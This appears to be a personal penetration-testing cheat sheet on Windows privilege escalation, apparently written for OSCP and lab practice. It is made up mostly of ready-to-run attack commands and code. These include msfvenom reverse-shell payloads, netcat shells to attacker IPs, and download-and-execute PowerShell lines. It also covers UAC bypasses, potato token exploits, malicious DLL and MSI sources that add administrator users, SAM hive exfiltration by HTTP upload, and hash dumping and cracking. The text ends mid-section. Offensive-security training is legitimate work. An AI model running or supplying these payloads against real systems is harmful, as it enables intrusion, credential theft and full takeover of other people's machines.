# Privilege Escalation (Windows)

<details>

<summary>Automated Tools</summary>

* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)

If unable to run scripts/executables on target, use Windows Exploit Suggester on attacker's machine

### Windows Exploit Suggester

On Victim: `systeminfo`

On Attacker:&#x20;

```bash
python2.7 windows-exploit-suggester.py --update
```

```bash
python2.7 windows-exploit-suggester.py -i systeminfo -d 2023-03-10-mssb.xls
```

### PowerUp.ps1

```bash
powershell -ep bypass -c "Import-Module .\powerup.ps1; Invoke-AllChecks"
```

```bash
powershell -ep bypass
Import-Module .\powerup.ps1
. .\powerup.ps1
Invoke-AllChecks
```

### Windows Privesc Check

<pre><code><strong>windows-privesc-check --dump -G
</strong></code></pre>

</details>

### Enumeration

<details>

<summary>Basic System Info</summary>

* To find the username the shell is running as

```bash
whoami
```

* Checks privileges

```bash
whoami /priv
```

* To find the OS, version and architecture

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

* List system-wide updates

```shell
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

* Powershell command to enumerate the loaded device drivers and kernel modules

```shell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```

* Request the version of each of the loaded driver

```shell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

</details>

<details>

<summary>Users &#x26; Groups</summary>

* To find the user and groups that a user belongs

```shell
net user <username>
```

* To find other accounts

```shell
net user
```

* Check who's in the local administrator group

```bash
net localgroup administrators
```

* Check what groups the user is in

```bash
whoami /groups
```

</details>

<details>

<summary>Registry</summary>

```bash
reg query HKLM /f password /t REG_SZ /s
```

* Find admin AutoLogon credentials

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

* Check if Always Install Elevated is enabled

```shell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```shell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

</details>

<details>

<summary>Network </summary>

* Show network interfaces

```shell
ipconfig /all
```

* Show the routing table

```shell
route print
```

* Show active listening network connections

```shell
# To obtain the PID, listening ports
netstat -an | findstr LISTEN

# To determine which service is running on a particular port
tasklist /v | findstr <PID>
powershell -c Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
```

Are there any internal services? (Local address that's not 0.0.0.0)

* Show the firewall profile&#x20;
  * is it active?

```shell
netsh advfirewall show currentprofile
```

#### Show all firewall rules

* New:

```bash
netsh advfirewall firewall dump
```

* Old:

```shell
netsh advfirewall firewall show rule name=all
```

```bash
netsh firewall show state
```

```bash
netsh firewall show config
```

* Obtain different drives' names

```bash
wmic logicaldisk get caption
```

* List all drives that are currently mounted and those physically connected but not mounted

```shell
mountvol
```

</details>

<details>

<summary>Services </summary>

* View scheduled tasks

```shell
schtasks /query /fo LIST /v
```

* Lists applications that are installed by Windows Installer

```shell
wmic product get name, version, vendor
```

* To find the services

```bash
sc queryex type= service
```

* Running services

```shell
tasklist /SVC
```

</details>

<details>

<summary>Local Administrator Password Solution (LAPS)</summary>

* Secure and scalable way of remotely managing the local administrator password for domain-joined computers
  * ms-mcs-AdmPwd
    * Contains the clear text password of the local administrator account

## Check if LAPS is installed Locally

```powershell
# Identify if LAPS installed to Program Files
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
dir 'C:\Program Files\LAPS\CSE\'
dir 'C:\Program Files (x86)\LAPS\CSE\'

# Enumerate domain computers using LAPS via PowerView
Get-DomainComputer -Domain domain.com -LDAPFilter '(ms-Mcs-AdmPwdExpirationtime=*)'

# Identify which groups can view LAPS passwords
Get-DomainOU -Domain domain.com | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }
```

## Exploitation

```powershell
# PowerView
iex (New-Object System.Net.WebClient).DownloadString('http://192.168.45.198/PowerView.ps1')
Get-DomainComputer  | Select-Object 'dnshostname','ms-mcs-admpwd' | Where-Object {$_."ms-mcs-admpwd" -ne $null}

# OR LAPSToolKit
# git clone https://github.com/leoloobeek/LAPSToolkit.git
iex (New-Object Net.Webclient).DownloadString("http://IP/LAPSToolkit.ps1")
# Show LAPS enabled computers && cleartext password if any
Get-LAPSComputers
# Get the groupname that can view LAPS passwords
Find-LAPSDelegatedGroups
# Find the accounts that can view LAPS passwords
Get-NetGroupMember -GroupName "XXX"
```

If unable to get a shell as the user that's able to read LAPS passwords, then use LDAP to obtain the LAPS passwords ([https://github.com/n00py/LAPSDumper](https://github.com/n00py/LAPSDumper)):

```bash
python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
```

<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Files &#x26; Directories </summary>

Use `dir /a` to see hidden files (eg: `.git` files)

* Look at PowerShell history file

```sh
PS C:> cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine

# $env:APPDATA --> C:\Users\sql_svc\AppData\Roaming
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```bash
powershell -c dir $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine
powershell -c type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

* Search for any file or directory that allows the Everyone group write permissions

```shell
accesschk.exe -uws "Everyone" "C:\Program Files"
```

* AccessChk from SysInternals

- Powershell cmd to find files that can be modified by everyone

```shell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

</details>

<details>

<summary>Paths</summary>

### User PATH

```bash
%PATH%
FOR /F "tokens=1,3* skip=2" %G IN ('reg query HKCU\Environment') DO @echo %G=%H %I
```

### Global PATH

```bash
 FOR /F "tokens=1,3* skip=2" %G IN ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"') DO @echo %G=%H %I
```

</details>

<details>

<summary>Password Hunting</summary>

* Searching for the string `password` in files recursively from a directory
  * `s` = recursive
  * `p` = skip non-printable characters
  * `i` = case insensitive
  * `n` = print line numbers

```bash
findstr /spin /c:"password" *.*
```

```bash
findstr /si password *.xml *.ini *.txt
```

* Windows Autologin

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

* Powershell history file

```powershell
# In Powershell
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\

# In Cmd
C:\Users\YourUserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

* VNC

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

* SNMP

```bash
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

* Putty

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

* Registry

```bash
reg query HKLM /f password /t REG_SZ /s
```

```bash
findstr /si password *.txt *.ini *.config
```

</details>

<details>

<summary>Email Hunting</summary>

```bash
dir *.dbx /s
```

</details>

<details>

<summary>Presence of WSL</summary>

```bash
where /R c:\windows bash.exe
```

```bash
where /R c:\windows wsl.exe
```

</details>

<details>

<summary>Default files in Windows</summary>

* OS Determination

```bash
\windows\system32\license.rtf
```

```bash
\windows\system32\eula.txt
```

</details>

### Common Methods

<details>

<summary>Kernel</summary>

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### SMBGhost&#x20;

```bash
# CVE-2020-0796
# https://github.com/danigargu/CVE-2020-0796

# Compile it with Visual Studio. Change payload in exploit.cpp line 204 and add msfvenom payload 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.60 LPORT=8081 -f dll -f csharp

# Compile it. Change 'debug' to 'release', set correct architecture. 
# Transfer to target

.\cve-2020-0796-local.exe 
```

### MS16-032

<pre class="language-bash"><code class="lang-bash"># https://github.com/egre55/windows-kernel-exploits/blob/master/MS16-032:%20Secondary%20Logon%20Handle/Invoke-MS16-032-Remote-Shell.ps1#L10
<strong>
</strong><strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f exe -o reverse.exe
</strong>
#Edit inside Invoke-MS16-032-Remote-Shell.ps1
Remove all the "/c C:\Users\Public\Music\nc.exe host port -e cmd.exe"
Edit all the "C:\Windows\System32\cmd.exe" to "c:\HFS\reverse.exe"

# Must use the following 64bit Powershell exe
c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -ep bypass .\Invoke-MS16-032-Remote-Shell.ps1
</code></pre>

</details>

<details>

<summary>Tater (Hot Potato)</summary>

[https://github.com/Kevin-Robertson/Tater](https://github.com/Kevin-Robertson/Tater)

Affects the various windows versions

* Windows 7
* Windows 8
* Windows 10
* Windows Server 2008
* Windows Server 2012

Transfer `tater.ps1` over to victim

```bash
. .\tater.ps1
```

```bash
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

</details>

<details>

<summary>Show Currently Stored Creds</summary>

```bash
cmdkey /list
```

```
## Output
Target: Domain:interactive=ACCESS\\Administrator
                                                Type: Domain Password
User: ACCESS\\Administrator
```

```bash
runas /savecred /user:ACCESS\Administrator reverse.exe
```

</details>

<details>

<summary>Autoruns</summary>

```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

```shell
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

```shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

Have to wait for an administrator to login

</details>

<details>

<summary>Unquoted Service Path</summary>

Eg: Consider the string "c:\program files\sub dir\program name". The system tries to interpret the possibilities in the following order:&#x20;

* _**c:\program.exe, c:\program files\sub.exe, c:\program files\sub dir\program.exe, c:\program files\sub dir\program name.exe**_

```sh
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" 
```

```shell
sc qc <service_name>
```

If `START_TYPE : 2 AUTO_START` , then put in the malicious file and `shutdown /r /t 0` to restart the computer (hence, restarting the service).

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

```shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

```shell
net start unquotedsvc
```

c:\program.exe&#x20;

c:\program files\sub.exe&#x20;

c:\program files\sub dir\program.exe

c:\program files\sub dir\program name.exe

</details>

<details>

<summary>Binary Hijacking (Service)</summary>

```bash
# Generate Reverse Shell Executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.222 LPORT=80 -f exe -o reverse.exe

# Stop the service first to replace binary, otherwise access is denied.
net stop kiteservice

# Overwrite the service executable with malicious rev shell exe
move reverse.exe KiteService.exe

# Restarts the service
net start kiteservice

# Netcat Listener
┌──(root㉿kali)-[/prac_oscp/192.168.191.151]
└─# nc -lvp 80                                         
listening on [any] 80 ...
192.168.218.151: inverse host lookup failed: Unknown host
connect to [192.168.45.222] from (UNKNOWN) [192.168.218.151] 49999
Microsoft Windows [Version 10.0.19043.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

</details>

<details>

<summary>AlwaysInstallElevated</summary>

### Check the following registry keys:

Both keys are set to 1

```shell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Manual Method 1 (Simple)

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

### OR METHOD 2: [Custom MSI (Complex)](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md#manual-exploitation)

Open an existing random project in Visual Studio 2022-> go to Extensions tab -> Manage extensions

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Install "Microsoft Visual Studio Installer Projects 2022" --> Restart VS to complete the installation

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Create a adduser.c file

```c
int main ()
{
	int i;
	i = system ("net user bill P@ssw0rd123! /add");
	i = system("net localgroup administrators user /add");
	return 0;
}
```

Compile it&#x20;

```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Right click "always\_install\_elevated\_add\_bill" --> Properties

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Change TargetPlatform to x64

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Right click "always\_install\_elevated\_add\_bill" --> View --> Custom Actions

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Right-click "Custom Actions" --> Add Custom Action

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Double-click into "Application Folder"

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Select "adduser.exe" --> OK

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Change Run64Bit option in Properties Window to True:

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Change build to release && build it with Cltrl-shift-b

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

```powershell
curl.exe http://192.168.45.218/always_install_elevated_add_bill.msi -o always_install_elevated_add_bill.msi
msiexec /quiet /qn /i always_install_elevated_add_bill.msi
```

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### OR USING METASPLOIT

```powershell
use exploit/windows/local/always_install_elevated
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set LHOST tun0
run
```

</details>

<details>

<summary>Scheduled Tasks</summary>

```bash
type C:\DevTools\CleanUp.ps1
```

```bash
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

```bash
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

</details>

<details>

<summary>Dumping Local NTLM Hashes</summary>

* Need to extract out SYSTEM and SAM registry hives but they are locked by SYSTEM process --> unable to read/copy the files
* Create a volume snapshot
  * ```
    wmic shadowcopy call create Volume='C:'
    ```
  * ```
    vssadmin list shadows
    ```
  * ```
    copy 
    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam
     C:\users\offsec.corp1\Downloads\sam
    ```
  * ```
    copy 
    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
     C:\users\offsec.corp1\Downloads\system
    ```
* Using reg save
  * ```
    reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
    ```
  * ```
    reg save HKLM\system C:\users\offsec.corp1\Downloads\system
    ```
* Decrypt the SYSTEM & SAM files
  * creddump
    *   ```
        git clone https://github.com/Tib3rius/creddump7
        cd creddump7
        python3 -m venv venv
        pip3 uninstall crypto 
        pip3 uninstall pycrypto 
        install pycryptodome
        python3 pwdump.py ../system1 ../sam1 
        ```



</details>

<details>

<summary>Security Account Manger (SAM) Dump</summary>

* Located in `c:\windows\system32\config`
* Extract out the passwords, hashes

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Transfer the SAM and SYSTEM files to kali thru SMB

```shell
copy C:\Windows\Repair\SAM \\10.11.67.208\kali\
```

```shell
copy C:\Windows\Repair\SYSTEM \\10.11.67.208\kali\
```

On Kali:

```shell
git clone https://github.com/Tib3rius/creddump7;pip3 install pycryptodome
```

On Kali:

```python
python3 creddump7/pwdump.py SYSTEM SAM
```

`admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::` –> First hash is LM hash followed by NTLM hash!

On Kali:

```bash
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

</details>

<details>

<summary>Ntds.dit &#x26; SYSTEM Dump</summary>

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

</details>

<details>

<summary>Passing the Hash</summary>

* Pass in the full admin hash (includes both LM and NTLM hash, separated by colon)

```bash
pth-winexe -U 'admin%hash' //10.10.202.204 cmd.exe
```

</details>

<details>

<summary>User In Local Group with Admin Privileges (UAC Bypass)</summary>

### EventViewer-UACBypass

[https://github.com/CsEnox/EventViewer-UACBypass](https://github.com/CsEnox/EventViewer-UACBypass)

* Generate reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8443 EXITFUNC=thread -f exe -o reverse.exe
```

* Abuse SeImpersonate privileges to obtain&#x20;
* Run `Invoke-EventViewer`

```bash
Import-Module .\Invoke-EventViewer.ps1
Invoke-EventViewer c:\temp\reverse.exe
```

OR using [FodhelperBypass.ps1](https://raw.githubusercontent.com/winscripting/UAC-bypass/refs/heads/master/FodhelperBypass.ps1)

```powershell
# Load FodHelper in memory
iex (new-object net.webclient).downloadstring('http://192.168.45.218/FodhelperBypass.ps1')

# Using ps_shellcode_runner
FodhelperBypass -program "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
```

</details>

<details>

<summary>Running Administrator account from normal user account</summary>

```bash
runas /env /profile /user:Administrator "c:\temp\nc.exe -e cmd.exe 192.168.45.5 443"
```

</details>

### Token Impersonation Attacks

<details>

<summary>SigmaPotato (Windows 2012 - Windows 2022)<br>Abuse seImpersonate privileges to obtain NT AUTHORITY\SYSTEM </summary>

```bash
.\sigmapotato.exe --revshell 192.168.45.218 4444
```

[https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)

</details>

<details>

<summary>PrintSpoofer (Windows 10, Server 2016/2019)</summary>

Works on all versions of Server 2016 and Server 2019, as well as every version of Windows 10 from at least 1607 onwards.

![](<../.gitbook/assets/image (147).png>)

![](<../.gitbook/assets/image (125).png>)

* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

- From Local/NETWORK SERVICE to system by abusing SeImpersonatePrivilege

* This step is purely to simulate getting a service account shell

```bash
.\printspoofer64.exe -c "nc64.exe -e cmd.exe 192.168.45.213 53"
```

```bash
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

```bash
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

</details>

<details>

<summary>Juicy Potato</summary>

Does not work on Win10 version >= 1809, Server2019. Check Win10 versions [here](https://juggernaut-sec.com/wp-content/uploads/2022/05/image-218.png).

![](<../.gitbook/assets/image (137).png>)

* [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

- `SeImpersonatePrivilege` is enabled —> vuln to JuicyPotato PrivEsc
- Transfer nc.exe `copy \\10.10.14.6\share\nc32.exe .`

```bash
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\Desktop\nc32.exe -e cmd.exe 10.10.14.6 4444" -t *
```

* If obtained the following error —> might be due to wrong CLSID
  * Find CLSID. For win server 2012 —> {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
  * [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)
    * Find the BITS CLSIDs and test those first
  * Add as `-c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}`
    * `-c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`

```bash
Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 1337
COM -> recv failed with error: 10038
```

* If obtained the following error —> might be windefender detecting and deleting the exploit.

```bash
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\\SYSTEM

[-] CreateProcessWithTokenW Failed to create proc: 2

[-] CreateProcessAsUser Failed to create proc: 2
```

</details>

<details>

<summary>Incognito</summary>

* Manual way: [https://github.com/milkdevil/incognito2/blob/master/incognito.exe](https://github.com/milkdevil/incognito2/blob/master/incognito.exe)
  * ```
    incognito.exe list_tokens -u
    msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o reverse_80.exe
    incognito.exe execute -c "sandbox\Administrator" reverse_80.exe
    ```

- Metasploit's method:
  * ```
    load incognito
    list_tokens -u      (Delegation tokens allow full authentication, while Impersonation tokens allow acting as another user.)
    impersonate_token corp1\\admin
    getuid
    ```



</details>

<details>

<summary>Rogue Potato</summary>

Works on versions of Windows after the changes took place (1809+)

Requires SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege

* [Rogue Potato ](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0)

- Setting up a spoofed OXID resolver
  * Forwards Kali port 135 to port 9999 on Windows.

```bash
socat tcp-listen:135,reuseaddr,fork tcp:<victim's IP>:9999
```

```bash
.\RoguePotato.exe -r 172.16.1.30 -e "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -l 9999
```

* `-c "{6d18ad12-bde3-4393-b311-099c346e6df9}"`

</details>

### Less Common Methods

<details>

<summary>Insecure Service Permissions (Modifiable Service)</summary>

* Checks the “user” account’s permissions on the ”daclsvc” service

- “user” account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG)

```shell
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

```shell
sc qc daclsvc
```

```shell
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

```shell
net start daclsvc
```

OR USING POWERSHELL...

```powershell
cmd /c sc qc <service_name>
```

<figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

Start Type --> Change to autostart

```powershell
cmd /c sc config <service_name> start=auto
```

Add final.com\nina to local administrators group: --> DO NOTE THAT LocalService doesn't have enough rights to add users

```powershell
cmd /c sc config <service_name> binpath= "net localgroup Administrators final.com\nina /add" obj= "NT AUTHORITY\SYSTEM"
```

Ensure that changes are updated & run it

```
cmd /c sc qc <service_name>
net start <service_name>
```

"The service is not responding to the control function." is normal.

<figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

\--------OR------------------------

```powershell
sc.exe stop browser
sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator P@ssw0rd123!"
sc.exe qc browser
sc.exe start browser
```

</details>

<details>

<summary>DLL Hijacking</summary>

* Find the DLLs that have `NAME NOT FOUND` and is in writable directories.
  * eg `c:\temp\hijackme.dll`

```bash
 // For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o        output.dll
 // For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.  dll
 
 #include <windows.h>
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
     if (dwReason == DLL_PROCESS_ATTACH) {
         system("cmd.exe /k net localgroup administrators user /add");
         ExitProcess(0);
     }
     return TRUE;
 }
```

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

* Transfer `output.dll` to `c:\temp\hijackme.dll`
* Restart the `dllsvc` service
  * `sc stop dllsvc`
  * `sc start dllsvc`

## OR..

In CLIENT01 process monitor:

![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

* Create malicious msasn1.dll & save to C:\Program Files\FileZilla Server --> Rev shell
  * ```powershell
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o msasn1.dll
    ```
  * ```powershell
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set ExitOnSession false; exploit -j"
    ```
    *

        <figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


  * Start Filezilla server
* ```powershell
  Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
  copy-item C:\shares\home\mary\msasn1.dll -destination "C:\Program Files\FileZilla Server\msasn1.dll"
  ```

</details>

<details>

<summary>Weak Registry Permissions</summary>

* To find weak registry perm, use the following command
  * Will show `NT AUTHORITY\INTERACTIVE Allow FullControl`

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

* Using command prompt,

```bash
sc qc regsvc
```

It runs with SYSTEM privileges (SERVICE\_START\_NAME)

```bash
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

Registry entry for regsvc service is writable by NT AUTHORITY\INTERACTIVE group (essentially all logged-on users)

```basic
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Overwrite the ImagePath registry key to point to the reverse.exe executable

```bash
net start regsvc
```

</details>

<details>

<summary> Insecure service Executables</summary>

<pre class="language-shell"><code class="lang-shell"><strong>sc qc filepermsvc
</strong></code></pre>

It runs with SYSTEM privileges (SERVICE\_START\_NAME)

```shell
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Service binary (BINARY\_PATH\_NAME) file is writable by everyone)

```shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

```shell
net start filepermsvc
```

</details>

<details>

<summary>Insecure GUI Apps</summary>

Login to user account

```bash
rdesktop -u user -p password321 10.10.201.218
```

Double-click `AdminPaint` shortcut on Desktop

```bash
tasklist /V | findstr mspaint.exe
```

Paint is running with admin privileges

In Paint, `File` –> `Open`. `file://c:/windows/system32/cmd.exe`

</details>

<details>

<summary>Startup Apps</summary>

* To search for writable startup apps folder
  * he `BUILTIN\Users`group has full access ‘(F)’ to the directory

```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

* Generate reverse shell:&#x20;

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.20.202 LPORT=443 -f exe > reverse.exe
```

* Put `reverse.exe` into startup folder

```bash
copy reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.exe"
```

* Wait for administrator to login

</details>

<details>

<summary>SeRestorePrivilege</summary>

```bash
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
mv C:\Windows\System32\cmd.exe c:\Windows\System32\utilman.exe
```

On Kali:

```bash
rdesktop 192.168.204.165
```

Win Key + U --> Spawned NT Authority\System shell

</details>

<details>

<summary>SeBackupPrivilege</summary>

On Victim:

```bash
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

Transfer files to attacker:

```bash
(New-Object System.Net.WebClient).UploadFile('http://10.10.14.3/', 'c:\temp\sam')
(New-Object System.Net.WebClient).UploadFile('http://10.10.14.3/', 'c:\temp\system')
```

Dump out the hashes

```bash
/usr/share/creddump7/pwdump.py system sam
```

</details>

<details>

<summary>WerTrigger</summary>

For Example, MySQL Service has File Write permission as SYSTEM

Checking to see if MySQL Service has File Write perm as SYSTEM:

<pre class="language-sql"><code class="lang-sql">MariaDB [(none)]> select load_file('C:\\temp\\chiselx64.exe') into dumpfile 'C:\\temp\\try.exe';
<strong>
</strong><strong>#Have File Write permission as SYSTEM through mysql.
</strong>c:\temp>icacls try.exe
try.exe NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)
</code></pre>

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger)

[https://github.com/sailay1996/WerTrigger](https://github.com/sailay1996/WerTrigger)

```sql
c:\temp>certutil -urlcache -f http://192.168.45.5/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\temp>certutil -urlcache -f http://192.168.45.5/WerTrigger.exe WerTrigger.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

